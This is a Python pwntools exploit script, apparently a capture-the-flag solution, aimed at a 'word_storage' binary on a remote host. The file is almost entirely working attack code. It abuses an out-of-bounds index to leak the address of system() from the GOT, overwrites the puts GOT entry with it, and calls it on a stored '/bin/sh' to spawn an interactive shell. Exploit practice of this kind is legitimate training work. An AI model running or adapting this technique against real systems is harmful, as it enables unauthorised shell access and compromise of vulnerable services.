#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template word_storage.elf '--port=11671' '--host=109.233.56.90'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('word_storage.elf')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11671)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# 0x404020		.got.plt:		puts()
# 0x404028		.got.plt:		system()
# 0x4040A0		.bss:			data[0]

puts_GOT_ADDR = 0x404020
system_GOT_ADDR = 0x404028
data_ADDR = 0x4040A0

io = start()

io.recvuntil(b'> ')
io.sendline(b'1')	# store
io.recvuntil(b'Enter index: ')
io.sendline(b'0')	# index = 0
io.recvuntil(b'Enter word: ')
io.send(b'/bin/sh')	# /bin/sh

io.recvuntil(b'> ')
io.sendline(b'2')	# get
io.recvuntil(b'Enter index: ')
io.sendline( str((data_ADDR - system_GOT_ADDR)//-8).encode() )	# get system_ADDR

addrs = io.recvuntil(b'\x0a\x0aChoose')
addrs = addrs.split(b'\x0a\x0aChoose')[0]
system_ADDR = addrs+b'\x00\x00'	# make system_ADDR

io.recvuntil(b'> ')
io.sendline(b'1')	# store
io.recvuntil(b'Enter index: ')
io.sendline( str((data_ADDR - puts_GOT_ADDR)//-8).encode() )	# instead puts_ADDR
io.recvuntil(b'Enter word: ')
io.send(system_ADDR)

io.recvuntil(b'> ')
io.sendline(b'2')	# get
io.recvuntil(b'Enter index: ')
io.sendline(b'0')	# index = 0

io.interactive()

